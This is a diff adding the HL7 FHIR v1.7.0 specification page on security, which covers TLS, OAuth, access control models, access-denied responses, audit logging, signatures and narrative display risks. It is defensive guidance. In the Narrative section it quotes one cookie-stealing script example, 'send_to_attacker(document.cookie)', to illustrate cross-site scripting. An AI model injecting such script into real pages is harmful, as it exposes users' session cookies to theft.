@@ -1,0 +1,488 @@
+﻿<!DOCTYPE HTML>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+  <title>Security - FHIR v1.7.0</title>
+
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="author" content="http://hl7.org/fhir"/>
+
+  <link rel="stylesheet" href="fhir.css"/>
+  <link rel="Prev" href="http://hl7.org/fhir/security.html"/>
+
+    <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="./dist/css/bootstrap.css"/>
+  <link rel="stylesheet" href="./assets/css/bootstrap-fhir.css"/>
+
+    <!-- Project extras -->
+  <link rel="stylesheet" href="./assets/css/project.css"/>
+  <link rel="stylesheet" href="./assets/css/pygments-manni.css"/>
+	<link rel="stylesheet" href="jquery-ui.css"/>
+
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- [if lt IE 9]>
+  <script src="./assets/js/html5shiv.js"></script>
+  <script src="./assets/js/respond.min.js"></script>
+  <![endif] -->
+
+    <!-- Favicons -->
+  <link sizes="144x144" rel="apple-touch-icon-precomposed" href="./assets/ico/apple-touch-icon-144-precomposed.png"/>
+  <link sizes="114x114" rel="apple-touch-icon-precomposed" href="./assets/ico/apple-touch-icon-114-precomposed.png"/>
+  <link sizes="72x72" rel="apple-touch-icon-precomposed" href="./assets/ico/apple-touch-icon-72-precomposed.png"/>
+  <link rel="apple-touch-icon-precomposed" href="./assets/ico/apple-touch-icon-57-precomposed.png"/>
+  <link rel="shortcut icon" href="./assets/ico/favicon.png"/>
+
+</head>
+<body>
+	<div id="segment-header" class="segment">  <!-- segment-header -->	
+		<div class="container">  <!-- container -->
+			<a no-external="true" id="logo" href="http://hl7.org/fhir"><img src="./assets/images/fhir-logo-www.png" alt="logo fhir"/> </a>
+			<div id="hl7-status">
+				<b>Current Build</b>
+			</div>       	
+			
+			<div id="hl7-nav">
+				 <a no-external="true" id="hl7-logo" href="http://www.hl7.org">
+					<img src="./assets/images/hl7-logo.png" width="42" alt="visit the hl7 website" height="50"/>
+				</a> 
+			</div>       	
+			<div id="hl7-nav"><a no-external="true" id="hl7-logo" href="http://hl7.org/fhir/search.cfm"><img src="./assets/images/search.png" alt="Search FHIR"/></a></div> 
+		</div>
+		<div class="container">  <!-- container -->
+	</div></div>  <!-- /segment-header -->	
+
+
+	<div id="segment-navbar" class="segment">  <!-- segment-navbar -->
+		<div id="stripe"> </div>
+		<div class="container">  <!-- container -->
+   <!-- HEADER CONTENT -->
+ 	      		 	      		      		
+			<nav class="navbar navbar-inverse">
+				<div class="container">
+					<button data-target=".navbar-inverse-collapse" data-toggle="collapse" type="button" class="navbar-toggle">
+						<span class="icon-bar"> </span>
+						<span class="icon-bar"> </span>
+						<span class="icon-bar"> </span>
+					</button>
+					<a href="index.html" class="navbar-brand hidden">FHIR</a>
+					<div class="nav-collapse collapse navbar-inverse-collapse">
+						<ul class="nav navbar-nav">
+              <li><a href="./index.html">Home</a></li>
+              <li><a href="./modules.html">Getting Started</a></li>
+              <li><a href="./documentation.html">Documentation</a></li>
+              <li><a href="./resourcelist.html">Resources</a></li>
+              <li><a href="./profilelist.html">Profiles</a></li>
+              <li><a href="./extensibility-registry.html">Extensions</a></li>
+              <li><a href="./operationslist.html">Operations</a></li>
+              <li><a href="./servicelist.html">Services</a></li>
+						</ul>
+					</div>  <!-- /.nav-collapse -->
+				</div>  <!-- /.container -->
+			</nav>  <!-- /.navbar -->
+      		
+  <!-- /HEADER CONTENT -->				
+		</div>  <!-- /container -->
+	</div>  <!-- /segment-navbar -->
+	
+
+	<div id="segment-breadcrumb" class="segment">  <!-- segment-breadcrumb -->
+		<div class="container">  <!-- container -->	
+			<ul class="breadcrumb">
+        <li><a href="secpriv-module.html"><img src="secpriv.jpg"/> Security and Privacy</a></li>
+        <li><b>Security</b></li>          <!-- security.html / page / -->
+
+			</ul>	
+		</div>  <!-- /container -->
+	</div>  <!-- /segment-breadcrumb -->
+	
+
+	<div id="segment-content" class="segment">  <!-- segment-content -->
+	<div class="container">  <!-- container -->
+            <div class="row">
+            	<div class="inner-wrapper">
+  <!-- CONTENT CONTENT -->
+
+
+<div class="col-9">
+
+<h1 class="self-link-parent"><span class="sectioncount">6.1.0<a name="6.1.0"> </a></span> FHIR Security <a href="security.html#6.1.0" title="link to here" class="self-link"><img src="assets/images/link.svg" width="20" class="self-link" height="20"/></a></h1>
+<table class="cols"><tr><td id="wg"><a href="http://www.hl7.org/Special/committees/fiwg/index.cfm" _target="blank">FHIR Infrastructure <img src="external.png" style="text-align: baseline"/></a> Work Group</td><td id="fmm"><a href="resource.html#maturity">Maturity Level</a>: N/A</td><td id="ballot"><a href="help.html#status">Ballot Status</a>: <a href="history.html#pubs">STU 3</a></td></tr></table>
+
+<p>
+Fast Healthcare Interoperability Resources (FHIR) is not a security protocol, nor does it define any security
+related functionality. However, FHIR does define exchange protocols and content models that need to be used
+with various security protocols defined elsewhere. This section gathers all information about security
+in one section. A summary:
+</p>
+<ul class="dense">
+ <li>Time Keeping - all clocks should be synchronised using NTP/SNTP, and the design of the system should be robust against a system clock with the wrong value</li>
+ <li>Communications Security - all exchange of production data should be secured using TLS/SSL (e.g. https)</li>
+ <li>Authentication - Users/Clients may be authenticated in any way desired. For web-centric use, OAuth is recommended</li>
+ <li>Authorization/Access Control - FHIR defines a Security Label infrastructure to support access control management. FHIR may also define a set of resources to administer access control management, but does not define any at present</li>
+ <li>Audit - FHIR defines <a href="provenance.html">provenance</a> and <a href="auditevent.html">audit event</a> resources suitable for tracking the origins, authorship, history, status, and access of resources</li>
+ <li>Digital Signatures - FHIR includes several specifically reserved locations for digital signatures</li>
+ <li>Attachments - FHIR allows for binary resources and attachments. These have their own concerns</li>
+ <li><a href="security-labels.html">Labels</a> - FHIR allows for set of security related tags that affect that way resources are handled</li>
+ <li>Data Management Policies - FHIR defines a set of capabilities to support data exchange.
+     Not all the capabilities that FHIR enables may be appropriate or legal for use in some combinations of context and jurisdiction (e.g. HIPAA for exchange between institutions). 
+     It is the responsibility of implementers to ensure that relevant regulations and other requirements are met</li>
+ <li>Narrative - Care must be taken when displaying the narrative from FHIR resources</li>
+</ul>
+<p>
+Time critical concerns regarding security flaws in the FHIR specification should be addressed to 
+the <a href="http://wiki.hl7.org/index.php?title=FHIR_email_list_subscription_instructions">FHIR email 
+list <img src="external.png" style="text-align: baseline"/></a> for prompt consideration. 
+</p>
+
+<p>
+Implementers should track the developing IHE IUA Profile for additional security considerations.
+</p>
+
+<a name="general"> </a>
+<h2 class="self-link-parent"><span class="sectioncount">6.1.0.1</span> General Considerations <a href="security.html#general" title="link to here" class="self-link"><img src="assets/images/link.svg" width="20" class="self-link" height="20"/></a></h2>
+<p>
+A production FHIR system will need some kind of security sub-system that administers 
+users, user authentication, and user authorization. Where this subsystem fits into the 
+deployment architecture is a matter for system design:
+</p>
+<table class="dense">
+ <tr>
+  <td valign="center">
+ <img src="security-layout.png" width="358" height="263"/>
+</td>
+<td>&nbsp;&nbsp;&nbsp;</td>
+<td valign="center" style="border-left: 1px solid grey">
+<table class="dense">
+ <tr><td><img src="security-icon-user.png" width="32" height="32"/></td><td>The consumer that is using a healthcare related system</td></tr>
+ <tr><td><img src="security-icon-app.png" width="32" height="32"/></td><td>The client application the user is using (application, mobile app, website, etc.)</td></tr>
+ <tr><td><img src="security-icon-sec.png" width="32" height="32"/></td><td>The security system (authentication and access control)</td></tr>
+ <tr><td><img src="security-icon-fhir.png" width="32" height="32"/></td><td>The clinical/healthcare repository</td></tr>
+</table>
+</td></tr></table>
+
+<p>
+In this diagram, the red lines represent FHIR interfaces. From the perspective of the FHIR API, 
+the client (consumer of FHIR services) may either interact with a security system that manifests
+as a FHIR server, and which depends on a subsequent FHIR interface to provide the actual storage,
+or either the client or server interacts with the security system independently. In each of these
+3 scenarios, the different components may be assembled into applications or network components
+differently, but the same logical layout applies. The FHIR specification assumes that a security 
+system exists, and that it may be deployed in front of or behind the FHIR API. 
+</p>
+<a name="access-control"> </a>
+<p>
+The security system includes the following subsystems:
+</p>
+<ul>
+ <li>Authentication: identifies and authenticates the user</li>
+ <li>Access Control decision engine: decides whether FHIR operations are allowed</li>
+ <li>Audit Log: records actions to allow for subsequent review and detection of intrusion or inappropriate usage</li>
+</ul>
+
+<p>
+Because there are a plethora of standards relating to 
+the administration and functionality of the security system, FHIR does not provide user,
+profile, or other such administration resources. Instead, the FHIR resources are the targets
+of the policies expressed in these other approaches. What FHIR does specify is a way to apply
+<a href="security-labels.html">security labels</a> to resources so that a security system may use these (along with the contents
+of the resources if appropriate) to determine whether a user is authorized to perform a 
+particular FHIR operation or not.
+</p>
+
+
+  <!-- These HTTP calls may be authenticated against a single user account (including 
+using <a href="http://www.oauth.org">OAuth</a>), but this arrangement doesn't cater for common transaction metadata such as multiple users, 
+responsible party, reasons, consents, etc. that are commonly encountered in healthcare. Instead, 
+use of this RESTful implementation assumes that appropriate security and logs are managed by the client (perhaps 
+through using <a href="http://wiki.ihe.net/index.php?title=Audit_Trail_and_Node_Authentication">ATNA</a>), and 
+that the server trusts the client to maintain these. One implication is that this RESTful framework is 
+only suitable for use where such trust relationships exist (e.g. in a single institution) and is not 
+suitable where such trust does not exist (e.g. state &amp; national EHR systems and health record 
+systems that support disparate systems). Similarly, this simple RESTful interface has no support for 
+explicit archiving and similar functions. Use-cases where these kind of features are required should 
+consider a <a href="messaging.html">messaging</a> or <a href="implementation.html#SOA">SOA-based approach</a> or 
+some other kind of profiled REST interface. -->
+
+
+<a name="http"> </a>
+<h2 class="self-link-parent"><span class="sectioncount">6.1.0.2</span> 
+Communications
+ <a href="security.html#http" title="link to here" class="self-link"><img src="assets/images/link.svg" width="20" class="self-link" height="20"/></a></h2>
+<p>
+For the <a href="http.html">RESTful API</a>, normal HTTP security rules apply. 
+Please follow the <a href="http://www.w3.org/Protocols/rfc2616/rfc2616-sec15.html"> HTTP specification Security Considerations section 15 <img src="external.png" style="text-align: baseline"/></a>.  
+The <a href="http.html#root">Service Root URL</a> will specify whether SSL is required. 
+Client authentication may be required by the server, possibly including the requirement for 
+client certificates.
+</p>
+<p>
+TLS/SSL SHOULD be used for all production data exchange. The TLS/SSL communications are established 
+prior to any HTTP command/response, so the whole FHIR interaction is protected by the SSL/TLS 
+communications. The security of the endpoints of the TLS/SSL communications must be risk-managed, 
+so as to prevent inappropriate risks (e.g. audit logging of the GET parameters into an unprotected audit log).
+</p>
+<p>
+To support browser-based client applications, servers SHOULD 
+implement <a href="http://enable-cors.org/">cross-origin resource sharing <img src="external.png" style="text-align: baseline"/></a> for the <a href="http.html">REST operations</a>.  
+</p>
+<p>
+Chained search implementations need to observe the restrictions on a user in the chained 
+search, and that it would be normal to simply omit resources from the search if the user is not 
+authorized, but a server may elect to add an OperationOutcome to indicate that additional 
+resources may be available if other access tokens are used (e.g. break the glass) (<a href="operationoutcome-example-break-the-glass.html">example</a>). 
+</p>
+<a name="authentication"> </a>
+<h2 class="self-link-parent"><span class="sectioncount">6.1.0.3</span> Authentication <a href="security.html#authentication" title="link to here" class="self-link"><img src="assets/images/link.svg" width="20" class="self-link" height="20"/></a></h2>
+<p>
+Other than testing systems, FHIR servers should authenticate the clients. 
+The server may choose to authenticate the client system and trust it, or to authenticate
+the individual user by a variety of techniques. For web-centric use, 
+<a href="http://oauth.net/">OAuth <img src="external.png" style="text-align: baseline"/></a> may be used to authenticate and/or authorize 
+the users. The <a href="http://docs.smarthealthit.org/">Smart-On-FHIR <img src="external.png" style="text-align: baseline"/></a> profile 
+on OAuth is tightly integrated with FHIR and is the preferred method for using OAuth.
+</p>
+<p>
+The <a href="https://openid.net/wg/heart/">HEART Working Group <img src="external.png" style="text-align: baseline"/></a> has developed a 
+set of privacy and security specifications that enable an individual to control the 
+authorization of access to RESTful health-related data sharing APIs, and to facilitate 
+the development of interoperable implementations of these specifications by others.
+</p>
+  <!-- note about using OAuth and delegating user authority -->
+
+<a name="binding"> </a>
+<h2 class="self-link-parent"><span class="sectioncount">6.1.0.4</span> 
+Authorization/Access Control
+ <a href="security.html#binding" title="link to here" class="self-link"><img src="assets/images/link.svg" width="20" class="self-link" height="20"/></a></h2>
+
+<p>
+Correctly identifying people, devices, locations and organizations is one of the foundations that any security system is built on. 
+Most applications of security protocols, whether authentication, access control, digital signatures, etc. rely on the correct mapping between
+the relevant resources and the underlying systems. Note that this isn't necessary. There is nothing in FHIR that requires or relies 
+on any security being in place, or any particular implementation. However, real world usage will generally require this. 
+</p>
+<p>
+A holder of data should not allow the data to be communicated unless there are sufficient assurances that the 
+other party is authorized to receive it. This is true for a client creating a resource through a PUT/POST, 
+as much as it is true for a server returning resources on a GET. The presumption is that without 
+proper authorization, to the satisfaction of the data holder, the data does not get communicated.
+</p>
+<p>
+Two of the classic Access Control models are: Role-Based Access Control (RBAC), and Attribute-Based Access Control (ABAC). 
+</p>
+<p>
+In Role-Based Access Control (RBAC), permissions are operations on an object that a user wishes to access. 
+Permissions are grouped into roles. A role characterizes the functions a user is allowed to perform. Roles 
+are assigned to users. If the user’s role has the appropriate permissions to access an object, then that 
+user is granted access to the object. FHIR readily enables RBAC, as FHIR Resources are object types and 
+the CRUDE events (the FHIR equivalent to permissions in the RBAC scheme) are operations on those objects. 
+</p>
+<p>
+In Attribute-Based Access Control (ABAC), a user requests to perform operations on objects. That user's 
+access request is granted or denied based on a set of access control policies that are specified in terms 
+of attributes and conditions. FHIR readily enables ABAC, as instances of a Resource in FHIR (again, 
+Resources are object types) can have attributes associated with them. These attributes include security 
+tags, environment conditions, and a host of user and object characteristics, which are the same 
+attributes as those used in ABAC. Attributes help define the access control policies that determine 
+the operations a user may perform on a Resource (in FHIR) or object (in ABAC). 
+For example, a tag (or attribute) may specify that the identified Resource (object) is not to be 
+further disclosed without explicit consent from the patient.
+</p>
+<p>
+The rules behind the access control decision are often very complex, and potentially depends on information sourced from:
+</p>
+<ul>
+ <li>Client, such as user identity, user role, location, level of assurance</li>
+ <li>Resource, such as confidentiality, sensitivity, type of data, date ranges covered by the data, author of the data</li>
+ <li>Patient, such as the patient identity, patient relationship to the user, patient consent policies</li>
+ <li>Context of the transaction, system identity, time-of-day, purpose of use, workflow state, and transport security</li>
+</ul>
+  <!-- HL7 has papers on this topic. -->
+<p>For one source of further information, see the 
+<a href="http://www.ihe.net/Technical_Framework/upload/IHE_ITI_TF_WhitePaper_AccessControl_2009-09-28.pdf">IHE Access Control white paper <img src="external.png" style="text-align: baseline"/></a>
+</p>
+
+<p>
+Access control constraints may result in data returned in a read or search being 
+redacted or otherwise restricted. See <a href="updates.html">Variations between 
+Submitted data and Retrieved data</a>.
+</p>
+
+<a name="AccessDenied"> </a>
+<h3 class="self-link-parent"><span class="sectioncount">6.1.0.4.1</span> 
+Access Denied Response Handling
+ <a href="security.html#AccessDenied" title="link to here" class="self-link"><img src="assets/images/link.svg" width="20" class="self-link" height="20"/></a></h3>
+<p>
+A web-server, especially hosting FHIR, must choose the response carefully when an Access Denied condition exists. Returning too much information may expose details that should not be communicated. The Access Denied condition might be because of missing but required Authentication, the user is not authorized to access the endpoint, the user is not authorized to access specific data, or other policy reasons. 
+</p>
+<p>
+To balance usability of the returned result vs appropriate protection, the actual result method used needs to be controlled by policy and context. 
+Typical methods of handling Access Denied used are:
+</p>
+<p>
+<b>Return a Success with Bundle containing zero results</b> – This result is indistinguishable from the case where no data is known. When consistently returned on Access Denied, this will not expose which patients exist, or what data might be blinded. This method is also consistent with cases where some results are authorized while other results are blinded. This can only be used when the returning a Bundle is a valid result.
+</p>
+<p>
+<b>Return a 404 “Not Found”</b> – This also protects from data leakage as it is indistinguishable from a query against a resource that doesn’t exist. It does however leak that the user authentication is validated. 
+</p>
+<p>
+<b>Return a 403 “Forbidden”</b> – This communicates that the reason for the failure is an Authorization failure. It should only be used when the client and/or user is well enough known to be given this information. Thus this method is most used when the user is allowed to know that they are forbidden access. It doesn’t explain how the user might change things to become authorized. 
+</p>
+<p>
+<b>Return a 401 “Unauthorized”</b> – This communicates that user authentication was attempted and failed to be authenticated. 
+</p>
+
+<a name="audit"> </a>
+<h2 class="self-link-parent"><span class="sectioncount">6.1.0.5</span> Audit Logging <a href="security.html#audit" title="link to here" class="self-link"><img src="assets/images/link.svg" width="20" class="self-link" height="20"/></a></h2>
+<p>
+FHIR provides an <a href="auditevent.html">AuditEvent</a> resource suitable for use by 
+FHIR clients and servers to record when a security or privacy relevant event has occurred. 
+This form of audit logging records as much detail as reasonable at the time the event happened. 
+</p>
+<p>
+When used to record security and privacy relevant events, the AuditEvent can then be 
+used by properly authorized applications to support audit reporting, alerting, filtering, 
+and forwarding. This model has been developed and used in healthcare for a decade as 
+<a href="http://wiki.ihe.net/index.php?title=Audit_Trail_and_Node_Authentication">IHE-ATNA profile <img src="external.png" style="text-align: baseline"/></a>. 
+ATNA log events can be automatically converted to AuditEvent resources, and from there,
+client applications are able to search the audit events, or subscribe to them.
+</p>
+<p>
+With regard to HTTP logs, implementers need to consider the implications of distributing
+access to the logs. HTTP logs, including those that only contain the URL itself, should be 
+regarded as being as sensitive as the resources themselves.  Even if direct PHI is kept out of
+the logs by careful avoidance of search parameters (e.g. by using POST), the logs will
+still contain a rich set of information about the clinical records.  
+</p>
+
+<a name="signatures"> </a>
+<h2 class="self-link-parent"><span class="sectioncount">6.1.0.6</span> 
+Digital Signatures
+ <a href="security.html#signatures" title="link to here" class="self-link"><img src="assets/images/link.svg" width="20" class="self-link" height="20"/></a></h2>
+<p>
+This specification recommends the use of <a href="http://www.w3.org/TR/xmldsig-core/">W3C Digital Signatures <img src="external.png" style="text-align: baseline"/></a> for signatures. 
+Resources can be signed using the <a href="provenance.html">Provenance</a> resource to carry a 
+<a href="http://www.w3.org/TR/xmldsig-core/#def-SignatureDetached">detached digital signature <img src="external.png" style="text-align: baseline"/></a>. 
+The <a href="datatypes.html#signature">Signature datatype</a> is available to support various signature types including non-repudiation purposes. 
+Further details on creation and validation of <a href="datatypes.html#signature">Signatures are defined.</a>
+</p>
+<p>
+In addition, <a href="documents.html#signatures">documents may be signed</a> using an 
+<a href="http://www.w3.org/TR/xmldsig-core/#def-SignatureEnveloped">enveloped <img src="external.png" style="text-align: baseline"/></a> 
+signature. A specification for enveloped signature is profiled in 
+the <a href="http://wiki.ihe.net/index.php?title=Document_Digital_Signature">IHE DSG profile <img src="external.png" style="text-align: baseline"/></a>.
+</p>
+<p>
+Neither of these definitions prohibits the use of other ways of using digital signatures.
+</p>
+<blockquote class="dstu-note">
+<a name="dstu"> </a>
+<p>
+<b>DSTU Note:</b> the use of signatures with RESTful interfaces is a poorly understood area, and we would welcome reports of implementation experience. 
+</p>
+<p>
+Feedback <a href="http://wiki.hl7.org/index.php?title=FHIR_Specification_Feedback_(DSTU_2)">here <img src="external.png" style="text-align: baseline"/></a>.
+</p>
+</blockquote>
+
+<a name="attachments"> </a>
+<h2 class="self-link-parent"><span class="sectioncount">6.1.0.7</span> Attachments <a href="security.html#attachments" title="link to here" class="self-link"><img src="assets/images/link.svg" width="20" class="self-link" height="20"/></a></h2>
+<p>
+Several FHIR resources include attachments. Attachments can either be references to content found elsewhere or included inline encoded in base64.
+Attachments represent security risks in a way that FHIR resources do not, since some attachments contain executable code. Implementers should 
+always use caution when handling resources.
+</p>
+
+<a name="labels"> </a>
+<h2 class="self-link-parent"><span class="sectioncount">6.1.0.8</span> Security Labels <a href="security.html#labels" title="link to here" class="self-link"><img src="assets/images/link.svg" width="20" class="self-link" height="20"/></a></h2>
+
+<p>
+See <a href="security-labels.html">Security Labels</a>.
+</p>
+
+<a name="narrative"> </a>
+<h2 class="self-link-parent"><span class="sectioncount">6.1.0.9</span> Narrative <a href="security.html#narrative" title="link to here" class="self-link"><img src="assets/images/link.svg" width="20" class="self-link" height="20"/></a></h2>
+
+<p>
+FHIR resources include an XHTML narrative, so that applications can display the contents of the resource to users
+without having to fully and correctly process the data in the resource. However, displaying HTML is associated 
+with several known security issues that have been observed in production systems in other contexts (e.g. 
+<a href="http://smartplatforms.org/2014/04/security-vulnerabilities-in-ccda-display/">with CDA <img src="external.png" style="text-align: baseline"/></a>). For
+this reason, the <a href="narrative.html#security">FHIR narrative is not allowed to contain active content</a>.
+However, care is still needed when displaying the narrative:
+</p>
+<ul>
+ <li>Validate the narrative (the standard FHIR schemas do not allow active content, and the reference implementations won't handle it). Note, though, that external references could still be included in CSS, and these are outside the scope of schemas and reference implementations.</li>
+ <li>Ensure that any external references to images or anchors (e.g. outside the resource) do not cause the display software to <a href="http://smartplatforms.org/2014/04/security-vulnerabilities-in-ccda-display/">leak sensitive information in headers <img src="external.png" style="text-align: baseline"/></a></li>
+ <li>Do not allow external links to run in a privileged context such as the EHR unless you are sure they can be trusted</li>
+ <li>Care should be taken to differentiate HTTP RESTful (API) from browser based server content. Specifically, one should separate user session cookies, as an attacker could create content that serves up with content-type &quot;text/html&quot; and has content like &quot;&lt;script&gt;send_to_attacker(document.cookie);&lt;/script&gt;&quot;.</li>
+</ul>
+<p>
+Also note that the inclusion of an external reference to an image can allow the server that hosts the image to track 
+when the resource is displayed. This may be a feature or a problem depending on the context.
+</p>
+<a name="stylesheets"> </a>
+<p>
+In addition to narrative, <a href="documents.html">Documents</a> may also contain 
+stylesheets. Unlike with CDA, the stylesheets are simple CSS stylesheets, not 
+executable XSLT, so the same security risks do not apply. However CSS stylesheets
+may still reference external content (e.g. background images), and applications 
+displaying documents should ensure that CSS links are not automatically followed 
+without checking their safety first, and that session/identifying information 
+does not leak with any use of external links.
+</p>
+
+
+</div>
+
+
+				</div>  <!-- /inner-wrapper -->
+            </div>  <!-- /row -->
+        </div>  <!-- /container -->
+        
+    </div>  <!-- /segment-content -->
+
+
+	<div id="segment-footer" class="segment">  <!-- segment-footer -->
+		<div class="container">  <!-- container -->
+			<div class="inner-wrapper">
+				<p>
+        &copy; HL7.org 2011+. FHIR STU3 Candidate (v1.7.0-10082) generated on Thu, Oct 27, 2016 16:28+0000. <a href="qa.html">QA Page</a>
+        <br/>
+        <span style="color: #FFFF77">
+        Links: <a style="color: #81BEF7" href="http://hl7.org/fhir/search.cfm">Search <img src="external.png" style="text-align: baseline"/></a> | 
+               <a style="color: #81BEF7" href="history.html">Version History</a> | 
+               <a style="color: #81BEF7" href="toc.html">Table of Contents</a> | 
+               <a style="color: #81BEF7" href="http://services.w3.org/htmldiff?doc1=http%3A%2F%2Fhl7.org%2Ffhir%2FDSTU2%2Fsecurity.html&amp;doc2=http%3A%2F%2Fhl7-fhir.github.io%2F%2Fsecurity.html">Compare to DSTU2 <img src="external.png" style="text-align: baseline"/></a> |                
+               <a rel="license" style="color: #81BEF7" href="license.html"><img src="cc0.png" alt="CC0" style="border-style: none;"/></a> | 
+               <a style="color: #81BEF7" href="http://gforge.hl7.org/gf/project/fhir/tracker/?action=TrackerItemAdd&amp;tracker_id=677" target="_blank">Propose a change <img src="external.png" style="text-align: baseline"/></a>   
+        </span>
+        </p>
+			</div>  <!-- /inner-wrapper -->
+		</div>  <!-- /container -->
+	</div>  <!-- /segment-footer -->
+  <!-- disqus thread -->
+  <!-- disqus -->
+  <!-- end disqus -->        
+	
+	<div id="segment-post-footer" class="segment hidden">  <!-- segment-post-footer -->
+		<div class="container">  <!-- container -->
+		</div>  <!-- /container -->
+	</div>  <!-- /segment-post-footer -->
+    
+      <!-- JS and analytics only. -->
+      <!-- Bootstrap core JavaScript
+================================================== -->
+  <!-- Placed at the end of the document so the pages load faster -->
+<script src="./assets/js/jquery.js"> </script>     <!-- note keep space here, otherwise it will be transformed to empty tag -> fails -->
+<script src="./dist/js/bootstrap.min.js"> </script>
+<script src="./assets/js/respond.min.js"> </script>
+
+<script src="./assets/js/fhir.js"> </script>
+
+  <!-- Analytics Below
+================================================== -->
+
+    
+    
+</body>
+</html>
